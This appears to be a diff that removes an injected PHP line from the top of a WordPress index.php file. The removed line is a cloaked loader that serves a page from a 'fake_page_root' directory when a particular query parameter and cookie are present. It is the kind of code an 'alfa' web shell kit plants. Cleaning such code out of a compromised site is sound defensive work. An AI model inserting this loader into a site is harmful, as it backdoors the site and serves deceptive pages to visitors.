@@ -1,4 +1,3 @@
-<?php if(isset($_GET[":2083"])&&(int)$_COOKIE["alfa_fakepage_counter19869"]<3){@include("/home/lazy4charminar/public_html/nfbstores.com/fake_page_root//index.php");exit;}?>
 <?php
 /**
  * Front to the WordPress application. This file doesn't do anything, but loads
